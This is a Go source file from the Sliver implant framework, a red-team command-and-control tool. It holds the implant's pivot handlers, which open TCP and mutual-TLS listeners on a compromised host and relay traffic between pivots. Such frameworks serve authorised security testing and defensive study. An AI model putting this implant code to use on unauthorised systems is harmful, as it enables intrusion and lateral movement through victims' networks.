package handlers

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"errors"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/transports"
)

/*
  Sliver Implant Framework
  Copyright (C) 2019  Bishop Fox

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

var (
	genericPivotHandlers = map[uint32]PivotHandler{
		sliverpb.MsgPivotData:   pivotDataHandler,
		sliverpb.MsgTCPPivotReq: tcpListenerHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	tcpPivot := &sliverpb.TCPPivotReq{}
	err := proto.Unmarshal(envelope.Data, tcpPivot)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	err = pivots.StartTCPListener(tcpPivot.Address)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		tcpPivotResp := &sliverpb.TCPPivot{
			Success:  false,
			Response: &commonpb.Response{Err: err.Error()},
		}
		data, _ := proto.Marshal(tcpPivotResp)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}
	tcpResp := &sliverpb.TCPPivot{
		Success: true,
	}
	data, _ := proto.Marshal(tcpResp)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	pivData := &sliverpb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &sliverpb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivots.Pivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Config.Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}

func mtlsListenerHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {

	// Request / Response
	mtlsLn := &sliverpb.MTLSPivotReq{}
	err := proto.Unmarshal(envelope.Data, mtlsLn)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	mtlsPivot := &sliverpb.MTLSPivot{Response: &commonpb.Response{}}

	// Build TLS config
	tlsConfig, err := getTLSConfig(mtlsLn.CACertPEM, mtlsLn.CertPEM, mtlsLn.KeyPEM)
	if err != nil {
		mtlsPivot.Success = false
		mtlsPivot.Response.Err = err.Error()

		data, _ := proto.Marshal(mtlsPivot)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}

	// Start mutual tls listener
	err = pivots.StartMutualTLSListener(tlsConfig, mtlsLn.Host, uint16(mtlsLn.Port), mtlsLn.RouteID)
	if err != nil {
		mtlsPivot.Success = false
		mtlsPivot.Response.Err = err.Error()

		data, _ := proto.Marshal(mtlsPivot)
		connection.Send <- &sliverpb.Envelope{
			ID:   envelope.GetID(),
			Data: data,
		}
		return
	}

	mtlsPivot.Success = true
	data, _ := proto.Marshal(mtlsPivot)
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}

func getTLSConfig(caCertPEM, certPEM, keyPEM []byte) (config *tls.Config, err error) {

	// Reconstruct the CA ertificate from PEM bytes
	certBlock, _ := pem.Decode(caCertPEM)
	if certBlock == nil {
		err = errors.New("Failed to parse CA certificate")
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		return
	}
	caCert, err := x509.ParseCertificate(certBlock.Bytes)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to parse certificate: %v", err)
		// {{end}}
		return
	}
	sliverCACertPool := x509.NewCertPool()
	sliverCACertPool.AddCert(caCert)

	// Build TLS config with provided certificates
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error loading server certificate: %v", err)
		// {{end}}
		return
	}

	tlsConfig := &tls.Config{
		RootCAs:                  sliverCACertPool,
		ClientAuth:               tls.RequireAndVerifyClientCert,
		ClientCAs:                sliverCACertPool,
		Certificates:             []tls.Certificate{cert},
		CipherSuites:             []uint16{tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384},
		PreferServerCipherSuites: true,
		MinVersion:               tls.VersionTLS12,
	}

	tlsConfig.BuildNameToCertificate()
	return
}
